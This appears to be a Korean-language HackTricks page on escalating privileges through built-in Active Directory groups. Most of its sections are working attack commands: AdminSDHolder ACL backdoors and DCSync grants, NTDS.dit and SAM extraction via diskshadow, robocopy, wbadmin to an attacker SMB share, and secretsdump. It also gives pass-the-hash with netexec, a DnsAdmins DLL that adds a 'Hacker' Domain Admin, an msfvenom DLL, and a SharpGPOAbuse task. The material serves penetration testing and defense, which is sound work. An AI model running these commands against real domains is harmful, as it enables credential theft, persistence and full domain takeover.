# 특권 그룹

{{#include ../../banners/hacktricks-training.md}}

## 관리 권한을 가진 잘 알려진 그룹

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

이 그룹은 도메인에서 관리자 권한이 아닌 계정과 그룹을 생성할 수 있는 권한을 갖습니다. 또한 도메인 컨트롤러(DC)에 대한 로컬 로그인을 허용합니다.

이 그룹의 구성원을 식별하려면 다음 명령을 실행합니다:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
새 사용자 추가가 허용되며, DC에 대한 로컬 로그인도 가능합니다.

## AdminSDHolder 그룹

The **AdminSDHolder** group's Access Control List (ACL)은 Active Directory 내의 모든 "protected groups" — 특히 고권한 그룹에 대한 권한을 설정하기 때문에 매우 중요합니다. 이 메커니즘은 무단 수정을 방지하여 이러한 그룹의 보안을 보장합니다.

공격자는 **AdminSDHolder** 그룹의 ACL을 수정하여 표준 사용자에게 전체 권한을 부여하는 방식으로 이를 악용할 수 있습니다. 이렇게 되면 해당 사용자는 모든 protected groups에 대한 완전한 제어권을 얻게 됩니다. 만약 이 사용자의 권한이 변경되거나 제거되더라도, 시스템 설계상 해당 권한은 한 시간 내에 자동으로 복구됩니다.

최근 Windows Server 문서에서는 여전히 여러 내장 operator 그룹을 **protected** objects로 취급합니다 (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, 등). **SDProp** 프로세스는 기본적으로 **PDC Emulator**에서 60분마다 실행되어 `adminCount=1`을 찍고 protected objects에서 상속을 비활성화합니다. 이는 persistence뿐만 아니라, protected group에서 제거되었음에도 non-inheriting ACL을 유지하고 있는 stale privileged users를 찾아내는 데 유용합니다.

멤버를 검토하고 권한을 수정하기 위한 명령어는 다음과 같습니다:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
복원 프로세스를 가속화하기 위한 스크립트가 있습니다: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

자세한 내용은 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)을 방문하세요.

## AD Recycle Bin

이 그룹의 구성원은 삭제된 Active Directory 객체를 읽을 수 있으며, 이는 민감한 정보를 노출시킬 수 있습니다:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
이는 **이전 권한 경로를 복구하는 데** 유용합니다. 삭제된 객체는 여전히 `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, 오래된 SPNs 또는 이후에 다른 운영자가 복원할 수 있는 삭제된 특권 그룹의 DN을 노출할 수 있습니다.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### 도메인 컨트롤러 접근

DC의 파일에 대한 접근은 `Server Operators` 그룹의 구성원이 아닌 경우 제한됩니다. 해당 그룹에 속하면 접근 권한 수준이 변경됩니다.

### 권한 상승

Sysinternals의 `PsService` 또는 `sc`를 사용하면 서비스 권한을 검사하고 수정할 수 있습니다. 예를 들어 `Server Operators` 그룹은 특정 서비스에 대해 전체 권한을 가지고 있어 임의 명령 실행과 권한 상승이 가능합니다:
```cmd
C:\> .\PsService.exe security AppReadiness
```
이 명령은 `Server Operators`가 전체 접근 권한을 가지고 있어 서비스를 조작해 권한을 상승시킬 수 있음을 보여준다.

## Backup Operators

`Backup Operators` 그룹의 구성원 자격은 `SeBackup` 및 `SeRestore` 권한 때문에 `DC01` 파일 시스템에 대한 접근을 제공한다. 이러한 권한은 `FILE_FLAG_BACKUP_SEMANTICS` 플래그를 사용해 명시적 권한이 없어도 폴더를 탐색하고 목록을 확인하며 파일을 복사할 수 있게 한다. 이 과정에는 특정 스크립트의 사용이 필요하다.

그룹 구성원을 나열하려면 다음을 실행:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### 로컬 공격

로컬에서 이러한 권한을 활용하려면 다음 단계를 수행합니다:

1. 필요한 라이브러리 가져오기:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` 활성화 및 확인:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 제한된 디렉토리에서 파일에 접근하고 복사합니다. 예:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

도메인 컨트롤러의 파일 시스템에 대한 직접 접근은 도메인 사용자와 컴퓨터의 모든 NTLM 해시를 포함하는 `NTDS.dit` 데이터베이스를 탈취할 수 있게 합니다.

#### diskshadow.exe 사용

1. `C` 드라이브의 섀도 복사본을 생성합니다:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 섀도 복사본에서 `NTDS.dit`를 복사:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
또는 파일 복사를 위해 `robocopy`를 사용하세요:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 해시 획득을 위해 `SYSTEM`과 `SAM`을 추출:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`에서 모든 hashes를 가져옵니다:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 추출 후: Pass-the-Hash to DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe 사용

1. 공격자 머신에 SMB 서버용 NTFS 파일시스템을 설정하고 대상 머신에서 SMB 자격 증명을 캐시합니다.
2. 시스템 백업 및 `NTDS.dit` 추출에 `wbadmin.exe`를 사용합니다:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** 그룹의 구성원은 권한을 이용해 종종 Domain Controllers에서 호스팅되는 DNS 서버에서 SYSTEM 권한으로 임의의 DLL을 로드할 수 있습니다. 이 기능은 상당한 공격 가능성을 제공합니다.

DnsAdmins 그룹 구성원을 나열하려면 다음을 사용하세요:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 임의 DLL 실행 (CVE‑2021‑40469)

> [!NOTE]
> 이 취약점은 DNS 서비스(일반적으로 DC 내부)에서 SYSTEM 권한으로 임의의 코드를 실행할 수 있게 합니다. 이 문제는 2021년에 수정되었습니다.

멤버는 다음과 같은 명령을 사용하여 DNS 서버가 임의의 DLL을 로드하도록 만들 수 있습니다(로컬 또는 원격 공유에서):
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL이 로드되기 위해서는 DNS 서비스를 재시작해야 합니다(추가 권한이 필요할 수 있음):
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, refer to ired.team.

#### Mimilib.dll

이것은 mimilib.dll을 사용하여 명령을 실행하도록 수정하는 것도 가능하며, 특정 명령이나 reverse shells를 실행하도록 변경할 수 있습니다. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### MitM을 위한 WPAD 레코드

DnsAdmins는 글로벌 쿼리 차단 목록(global query block list)을 비활성화한 후 WPAD 레코드를 생성하여 Man-in-the-Middle (MitM) 공격을 수행하기 위해 DNS 레코드를 조작할 수 있습니다. Responder나 Inveigh와 같은 도구를 사용하여 스푸핑 및 네트워크 트래픽 캡처를 수행할 수 있습니다.

### Event Log Readers
Members는 이벤트 로그에 접근할 수 있어 평문 비밀번호나 명령 실행 관련 세부 정보와 같은 민감한 정보를 찾을 수 있습니다:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

이 그룹은 도메인 객체의 DACLs를 수정할 수 있어 잠재적으로 DCSync 권한을 부여할 수 있습니다. 이 그룹을 악용한 권한 상승 기법은 Exchange-AD-Privesc GitHub repo에 자세히 설명되어 있습니다.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
이 그룹의 구성원으로 활동할 수 있다면, 일반적인 악용 방법은 attacker-controlled principal에게 [DCSync](dcsync.md)에 필요한 복제 권한을 부여하는 것입니다:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
역사적으로, **PrivExchange**는 메일박스 접근을 연쇄적으로 이용하고, Exchange 인증을 강제하며, LDAP relay를 통해 동일한 프리미티브에 도달했습니다. 그런 릴레이 경로가 완화된 경우에도, `Exchange Windows Permissions`의 직접적인 멤버십이나 Exchange 서버에 대한 제어권은 도메인 복제 권한을 얻는 매우 가치 있는 경로로 남아 있습니다.

## Hyper-V 관리자

Hyper-V 관리자는 Hyper-V에 대한 전체 접근 권한을 가지며, 이를 악용하면 가상화된 Domain Controllers를 제어할 수 있습니다. 여기에는 라이브 DC를 복제하거나 NTDS.dit 파일에서 NTLM 해시를 추출하는 것이 포함됩니다.

### Exploitation Example

실제적인 악용은 오래된 호스트 레벨 LPE 트릭보다는 보통 **offline access to DC disks/checkpoints**입니다. Hyper-V 호스트에 접근할 수 있다면, 운영자는 가상화된 Domain Controller를 체크포인트하거나 export하여 VHDX를 마운트한 뒤 게스트 내부의 LSASS를 건드리지 않고 `NTDS.dit`, `SYSTEM` 및 기타 비밀을 추출할 수 있습니다:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
From there, reuse the `Backup Operators` workflow to copy `Windows\NTDS\ntds.dit` and the registry hives offline.

## 그룹 정책 생성자 소유자

이 그룹은 구성원이 도메인에서 그룹 정책을 생성할 수 있게 해줍니다. 다만, 구성원은 사용자나 그룹에 그룹 정책을 적용하거나 기존 GPOs를 편집할 수는 없습니다.

중요한 뉘앙스는 **생성자가 새 GPO의 소유자가 된다**는 점이며, 보통 이후에 이를 편집할 수 있는 충분한 권한을 얻는다는 것입니다. 즉 이 그룹은 다음 중 하나를 할 수 있을 때 흥미롭습니다:

- 악성 GPO를 생성하고 관리자가 이를 대상 OU/도메인에 연결하도록 설득
- 이미 유용한 곳에 연결되어 있는 자신이 생성한 GPO를 편집
- GPO를 연결할 수 있는 다른 위임된 권한을 남용하는 동안 이 그룹이 편집 권한을 제공하는 경우

실제 악용은 보통 SYSVOL 기반 정책 파일을 통해 **Immediate Task**, **startup script**, **local admin membership**, 또는 **user rights assignment** 변경을 추가하는 것을 의미합니다.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### 권한 악용 및 명령

#### Print Operators

Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.

To list the members of this group, the following PowerShell command is used:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
도메인 컨트롤러에서는 이 그룹이 위험합니다. 기본 Domain Controller Policy가 **`SeLoadDriverPrivilege`**를 `Print Operators`에게 부여하기 때문입니다. 이 그룹 구성원의 상승된 토큰을 얻으면 해당 권한을 활성화하고 서명되었지만 취약한 드라이버를 로드하여 커널/SYSTEM으로 상승할 수 있습니다. 토큰 처리에 대한 자세한 내용은 [Access Tokens](../windows-local-privilege-escalation/access-tokens.md)를 확인하세요.

#### Remote Desktop Users

이 그룹의 구성원은 Remote Desktop Protocol (RDP)을 통해 PC에 대한 접근 권한을 부여받습니다. 이러한 구성원을 열거하기 위해 PowerShell 명령어들이 제공됩니다:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP를 악용하는 추가적인 정보는 전용 pentesting 자료에서 확인할 수 있다.

#### 원격 관리 사용자

구성원들은 **Windows Remote Management (WinRM)**을 통해 PC에 접근할 수 있다. 이들 구성원을 열거하는 방법은 다음과 같다:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**과 관련된 익스플로잇 기법은 별도의 문서를 참조해야 합니다.

#### Server Operators

이 그룹은 도메인 컨트롤러에서 백업 및 복원 권한, 시스템 시간 변경, 시스템 종료 등을 포함한 다양한 구성을 수행할 권한을 가지고 있습니다. 멤버를 열거하려면 제공된 명령은 다음과 같습니다:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
도메인 컨트롤러에서는 `Server Operators`가 일반적으로 **서비스 재구성 또는 시작/중지**할 수 있는 충분한 권한을 상속받고, 기본 DC 정책을 통해 `SeBackupPrivilege`/`SeRestorePrivilege`도 받습니다. 실제로, 이는 **service-control abuse**와 **NTDS extraction** 사이의 다리가 됩니다:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
서비스 ACL이 이 그룹에 변경/시작 권한을 부여하면, 해당 서비스를 임의의 명령을 가리키도록 설정하고 `LocalSystem`으로 시작한 다음 원래의 `binPath`를 복원한다. 서비스 제어가 잠겨 있는 경우에는 위의 `Backup Operators` 기법으로 되돌아가 `NTDS.dit`를 복사한다.

## 참고자료 <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
